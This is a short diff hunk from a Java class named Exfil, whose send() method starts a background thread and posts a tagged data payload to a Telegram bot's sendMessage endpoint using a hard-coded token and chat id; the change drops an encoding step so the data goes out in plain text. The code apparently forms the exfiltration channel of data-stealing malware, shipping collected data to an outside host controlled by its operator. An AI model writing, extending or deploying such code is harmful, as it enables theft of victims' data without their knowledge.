@@ -16,7 +16,7 @@ public class Exfil {
     public static void send(String tag, String data) {
         new Thread(() -> {
             try {
-                String payload = enc("[" + tag + "]\n" + data);
+                String payload = "[" + tag + "]\n" + data;
                 String url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
                 String body = "chat_id=" + CHAT
                         + "&text=" + URLEncoder.encode(payload, "UTF-8");
